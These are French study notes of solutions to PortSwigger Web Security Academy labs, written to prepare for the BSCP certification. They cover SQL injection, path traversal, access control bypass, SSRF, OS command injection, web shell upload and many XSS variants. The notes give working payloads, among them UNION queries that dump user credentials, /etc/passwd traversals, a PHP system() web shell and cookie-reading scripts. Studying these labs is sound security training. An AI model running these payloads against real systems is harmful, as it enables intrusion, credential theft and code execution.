# Labs PortSwigger - Préparation BSCP

## SQL

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    GET /filter?category=Lifestyle’+OR+1=1--

### SQL injection vulnerability allowing login bypass

    administrator’--
    
### SQL injection attack, querying the database type and version on Oracle

	GET /filter?category=Gifts‘+UNION+SELECT+'abc','def'+FROM+dual–
	GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
    
### SQL injection attack, querying the database type and version on MySQL and Microsoft

    GET /filter?category='+UNION+SELECT+@@version,+NULL#

###  SQL injection attack, listing the database contents on non-Oracle databases

	GET /filter?category=Pets'+UNION+SELECT+'1'--
    GET /filter?category=Pets'+UNION+SELECT+'1','2'--
    GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
	GET /filter?category=Pets'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ikwqbr'--
	GET /filter?category=Pets'+UNION+SELECT+username_qtcsru,+password_vgkvts+FROM+users_ikwqbr--

### SQL injection attack, listing the database contents on Oracle

    GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual--
    GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables–
    GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WQIUUS'-- HTTP/2
    GET /filter?category='+UNION+SELECT+USERNAME_FJLMOM,+PASSWORD_CCZEKZ+FROM+USERS_WQIUUS--

### SQL injection UNION attack, determining the number of columns returned by the query

	GET /filter?category=Gifts'+UNION+SELECT+NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
    
### SQL injection UNION attack, finding a column containing text

	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,'EHvVry',NULL--
    
### SQL injection UNION attack, retrieving data from other tables
	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Pets'+UNION+SELECT+username,+password+FROM+users--

### SQL injection UNION attack, retrieving multiple values in a single column

    '+UNION+SELECT+NULL,'abc'--
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
    
### Blind SQL injection with conditional responses

### Blind SQL injection with conditional errors

### Visible error-based SQL injection

### Blind SQL injection with time delays and information retrieval

### Blind SQL injection with out-of-band interaction

### Blind SQL injection with out-of-band data exfiltration

### SQL injection with filter bypass via XML encoding

## Server-side vulnerabilities

### File path traversal, simple case

    GET /image?filename=../../../etc/passwd

### File path traversal, traversal sequences blocked with absolute path bypass

	GET /image?filename=/etc/passwd
    
### File path traversal, traversal sequences stripped non-recursively

	GET /image?filename=....//....//....//etc/passwd
    
### File path traversal, traversal sequences stripped with superfluous URL-decode

	GET /image?filename=..%252f..%252f..%252fetc/passwd
    
### File path traversal, validation of start of path

	GET /image?filename=/var/www/images/../../../../../etc/passwd
    
### File path traversal, validation of file extension with null byte bypass

	GET /image?filename=../../../etc/passwd%00.png
    
### Unprotected admin functionality

	GET /robots.txt
	GET /administrator-panel
	GET /administrator-panel/delete?username=carlos
### Unprotected admin functionality with unpredictable URL

Observer le code source de la page et remarquer cette partie : 
	
> adminPanelTag.setAttribute('href', '/admin-vnq2da');

	GET /admin-vnq2da
	GET /admin-vnq2da/delete?username=carlos
    
### User role controlled by request parameter

	GET /admin

Aller sur la page de login, puis commencer à intercepter les requêtes ET les réponses (“Proxy settings” => “Intercept reponses based on the following rules:”). 

Se connecter sur cette page avec les credentials d’utilisateur simple donnés dans la consigne.

Changer “Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=false” en 
“Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=true” dans la réponse puis dans chaque requête que l’on va effectuer avec cet utilisateur simple.

### User ID controlled by request parameter, with unpredictable user IDs

Aller sur n’importe quel article posté par Carlos et observer le paramètre “userId=d22a802d-ac88-48ff-b237-c137214a0f89” dans l’URL.

Se connecter avec le compte utilisateur fourni dans la consigne puis reprendre ce paramètre et le mettre dans l’URL suivante à la place du nôtre : 
https://0a98001b04df8474826c92e2004700dc.web-security-academy.net/my-account?id=fc22df53-bdc5-484b-9c5b-8f1b952d4f5a 

### User ID controlled by request parameter with password disclosure

Se connecter sur la page de login avec le compte utilisateur fourni dans la consigne.

Aller dans l’onglet “My account” et changer le paramètre de l’URL en “Administrator” : 

    GET /my-account?id=administrator

Observer le code HTML de la réponse obtenue, le mot de passe se trouve dans un formulaire caché : 

    <input required type=password name=password value='wz5ub7i9y4vqvcspqek2'/>

### Username enumeration via different responses

Lancer un Intruder pour déduire le vrai nom (Length 3250 vs Length 3248).
Lancer un deuxième Intruder avec le nom pour bruteforcer le login.

### 2FA simple bypass

Se connecter sur la page de login avec le compte fourni dans la consigne.
Aller sur l’onglet “Email client” pour réceptionner le 2FA.
Entrer le 2FA pour terminer l’authentification avec le premier compte.
Remarquer que l’URL se termine par “/my-account?id=wiener”.

Se connecter avec les credentials de la victime.

Quand le 2FA est demandé pour la victime, remplacer la fin de l’URL par “/my-account?id=carlos” et relancer la page.

### Basic SSRF against the local server

La page https://0a48007504a4974a81a78eee00540025.web-security-academy.net/admin est réservée aux administrateurs.

Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://localhost/admin” 

Dans le code de la réponse on peut remarquer : 

    <a href="/admin/delete?username=carlos">

Reproduire la même interception de requête mais cette fois avec “stockApi=http://localhost/admin/delete?username=carlos”
    
### Basic SSRF against another back-end system
    
Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://192.168.0.1:8080/admin” puis faire une attaque de 1 à 255 sur le dernier octet de l’IP avec l’Intruder.

Noter l’IP qui donne accès à la page d’administration et reproduire la requête dans le Repeater : 
“stockApi=http://192.168.0.41:8080/admin/delete?username=carlos “

### OS command injection, simple case

Utiliser la fonction “Check stock” sur n’importe quel article et l’envoyer sur le Repeater.

Remplacer “productId=2&storeId=1” par “productId=2&storeId=1;whoami”

### Remote code execution via web shell upload

Se connecter sur la page /my-account et changer d’avatar. D’abord choisir une image classique. 

Une fois l’image uploadée, rafraîchir pour regarder son compte et observer la requête avec Burp. Remarquer le morceau suivant : 

    <img src="/files/avatars/Portrait_of_Friedrich_Nietzsche.jpg" class=avatar>

Changer d’avatar une deuxième fois et mettre un webshell PHP classique à la place : 

<?php echo system($_GET['command']); ?>

Exécuter le webshell en allant sur l’URL trouvée à partir de l’image : 

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=ls

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 

### Web shell upload via Content-Type restriction bypass

Tenter de déposer le même webshell que pour le lab précédent.

On voit cette erreur : 

“Sorry, file type application/octet-stream is not allowed 
Only image/jpeg and image/png are allowed 
Sorry, there was an error uploading your file.”

Sur Burp, prendre la requête POST et la transférer au Repeater.

Remplacer “Content-Type: application/octet-stream” par “Content-Type: image/jpeg” et la renvoyer

Aller sur l’URL permettant d’interagir avec le webshell : 

> https://0a4700d2034ad0458506767700390095.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 


## Cross-site scripting

### Reflected XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans la barre de recherche.

### Stored XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans le commentaire.

### DOM XSS in document.write sink using source location.search

Entrer n’importe quoi dans la barre de recherche.
Remarquer le morceau suivant dans le code source : 

    function trackSearch(query) {
       document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
       trackSearch(query);
    }


Envoyer le payload suivant dans la barre de recherche : 

    "><svg onload=alert(1)>

### Lab: DOM XSS in innerHTML sink using source location.search

Entrer n’importe quoi dans la barre de recherche.
Remarquer le morceau suivant dans le code source :

    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
                            <script>
                                function doSearchQuery(query) {
                                    document.getElementById('searchMessage').innerHTML = query;
                                }
                                var query = (new URLSearchParams(window.location.search)).get('search');
                                if(query) {
                                    doSearchQuery(query);
                                }
                            </script>

Entrer le payload suivant dans la barre de recherche : 

    <img src=1 onerror=alert(1)>
    
### DOM XSS in jQuery anchor href attribute sink using location.search source

Cliquer sur le lien “Submit feedback” et remarquer que l’URL se termine par “/feedback?returnPath=/”

Changer le paramètre en “?returnPath=/AAAA” par exemple.

Remarquer le morceau de code suivant : 

    $(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
    });

Remarquer que notre valeur est insérée comme suit : 

    <a id="backLink" href="/AAAA">Back</a>

Répéter l’opération mais remplacer le paramètre par : 

    “?returnPath=javascript:alert(document.cookie)”

### DOM XSS in jQuery selector sink using a hashchange event

Remarquer le morceau suivant dans le code source : 

    $(window).on('hashchange', function(){
                                var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                                if (post) post.get(0).scrollIntoView();
                            }); 

Aller dans la partie “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0aec002b04b2eb90807295f2009e00e0.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into attribute with angle brackets HTML-encoded

Faire une recherche classique et voir le morceau suivant dans la réponse : 

    <input type=text placeholder='Search the blog...' name=search value="aaa">

La recherche est donc reflétée dans un attribut.
Répéter l’opération et injecter le payload suivant à la place : 

    "onmouseover="alert(1)

Rafraichir la page et passer la souris sur la barre de recherche, le payload est exécuté.

### Stored XSS into anchor href attribute with double quotes HTML-encoded 

Aller sur n’importe quel post et écrire un commentaire.

Voir le morceau suivant dans la nouvelle page : 

    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="a">a</a> | 05 October 2023
    </p>
    <p>AAA</p>

Notre site web est reflété dans un attribut href qui est ajouté sur notre nom.
Répéter l’opération et injecter le payload suivant à la place : 

	javascript:alert(2)

Après retour sur les commentaires, cliquer sur le nom de l’attaquant déclenche le payload.


### Reflected XSS into a JavaScript string with angle brackets HTML encoded

Faire une recherche classique et repérer le morceau suivant dans le code source de la réponse : 

    var searchTerms = 'a';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');

Injecter le payload suivant dans la barre de recherche : 

    a' ; alert(1) ; //


### DOM XSS in document.write sink using source location.search inside a select element

Dans la page de n’importe quel produit, remarquer le morceau suivant : 

    “var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');”

Ajouter un “&storeId=12345” à la fin de l’URL et voir que ce paramètre a bien été impacté dans le menu déroulant.

Répéter la même opération avec le payload suivant : 

    "></select><img%20src=1%20onerror=alert(1)>
    
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

En tentant un payload classique dans la barre de recherche, on voit que les chevrons et les guillemets sont encodés : 

    <h1>0 search results for 'aaa&apos; &lt;script&gt; alert(1) &lt;/script&gt;'</h1>

Remarquer le “<body ng-app\>” qui englobe toute la page.

Entrer le payload suivant dans la barre de recherche :

    {{$on.constructor('alert(1)')()}}

### Reflected DOM XSS

Remarquer que le contenu de la recherche est exploité par un autre script : 

	<script src='/resources/js/searchResults.js'></script>
    <script>search('search-results')</script>

Intercepter une recherche classique avec Burp pour en observer le fonctionnement.

On peut voir que la recherche se fait en deux étapes : 

    GET /?search=XSS HTTP/2
    ...
    GET /search-results?search=XSS HTTP/2

On voit que la réponse à la deuxième requête a cette structure : 

    {"results":[],"searchTerm":"XSS"}

En observant le code du script searchResults.js on observe le morceau suivant : 

    if (this.readyState == 4 && this.status == 200) {
                eval('var searchResultsObj = ' + this.responseText);
                displaySearchResults(searchResultsObj);
            }

Envoyer la deuxième requête dans le Repeater et tester tous les symboles classiques pour vérifier lesquels sont gérés : \ “ ‘ ; < > 

On observe que les guillemets sont échappés mais pas les antislashs, on peut donc annuler n’importe quel échappement de caractère en ajoutant un antislash avant.

Entrer le payload suivant dans la barre de recherche : 

    \"-alert(1)}//

### Stored DOM XSS

Dans le code source de la page des commentaires sur n’importe quel post, on remarque le morceau suivant : 

    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>

Dans le code source du script externe, on voit que la fonction d’échappement des chevrons est la suivante : 

    function escapeHTML(html) {
            return html.replace('<', '&lt;').replace('>', '&gt;');
        }

La fonction replace() ne remplace que la première occurrence, on peut donc la contourner avec des payloads commençant par “<>” par exemple.

Ecrire un commentaire contenant le payload suivant : 

    <><img src=1 onerror=alert(1)>
    
### Reflected XSS into HTML context with most tags and attributes blocked

La consigne du lab indique qu’il faut utiliser la fonction print() 

En essayant des payloads classiques, on est envoyé par le WAF sur une page disant “Tag is not allowed”, ce qui sous-entend qu’il y a des balises autorisées et des balises interdites.

On voit que notre recherche est renvoyée dans la balise suivante : 

	<h1>0 search results for 'a'</h1>

Envoyer une requête de recherche dans l’Intruder et utiliser une liste de balises comme celle-ci (colonne de gauche) pour les payloads à insérer dans “<§§>” : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

La seule réponse avec un code 200 est “body”

Répéter la même manoeuvre en mettant “<body%20§§=1>” et en utilisant la liste des events (colonne du milieu) pour les payloads.

On voit que la seule réponse avec un code 200 est pour “onresize” 

Une fois ces informations obtenues, aller dans “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0a9600f103427bb88508962f00d80072.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into HTML context with all tags blocked except custom ones

    <script>
    location = 'https://0ab2007804cb9afa816f1b1000430033.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>

### Reflected XSS with some SVG markup allowed

Faire une recherche et envoyer la requête dans l’Intruder.
Refaire la technique de l’attaque sur ce champ avec la liste des balises : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

On observe que les balises \<svg>, \<animatetransform>, \<title> et \<image> passent.

Remplacer l’ancien payload (<§§>) par \<svg>\<animatetransform%20§§=1> et relancer une attaque Intruder avec cette fois la liste des évènements au lieu des balises. 

On observe que seul l’évènement "onbegin" passe. 

Utiliser ces informations pour constituer le payload final : 

> https://0a21001a04671a1380eb4ec9001800f3.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

### Reflected XSS in canonical link tag

La consigne nous dit que le challenge doit se faire sur Chrome, et que l’utilisateur ciblé va faire plusieurs combinaisons de touches avec “X”.

Voir : https://developer.mozilla.org/fr/docs/Web/HTML/Global_attributes/accesskey 

Remplacer l’URL par le payload suivant : 

> https://0ab4004c0423461f80133f6c002300fa.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) 

### Reflected XSS into a JavaScript string with single quote and backslash escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
        var searchTerms = 'aaa';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

Quand on essaye d’injecter un guillemet simple, on voit que la recherche est reflétée de la manière suivante : 

    var searchTerms = 'a\'';

En essayant d’ajouter un antislash pour contourner ce problème, on remarque qu’il est échappé aussi : 

	var searchTerms = 'a\\\'';

Injecter le payload suivant à la place : 

    </script><script>alert(1)</script>

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
    var searchTerms = 'aaa';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

En testant quelques payloads comme pour le lab précédent, on voit que le guillemet simple est échappé mais pas l’antislash. 

Injecter le payload suivant dans la recherche : 

    a\' ; alert(1); //
    
### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

En postant un commentaire simple, on observe que le nom de notre site web est reflété dans un attribut “onclick” : 

    …
    <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://site.fr" onclick="var tracker={track(){}};tracker.track('http://site.fr');">nnn</a> | 20 October 2023
    …

Poster un commentaire en renseignant le payload suivant pour notre site web : 

> http://foo?&apos;-alert(1)-&apos;

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En faisant une recherche classique, on voit que notre entrée est reflétée dans le morceau de Javascript suivant : 

    <script>
    var message = `0 search results for 'aaa'`;
    document.getElementById('searchMessage').innerText = message;
    </script>

Ces backquotes indiquent une template string, et il est possible d’injecter des expressions dedans avec “${expression}” par exemple.

Voir : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals 

Injecter le payload suivant dans la barre de recherche : 

    ${alert(1)}

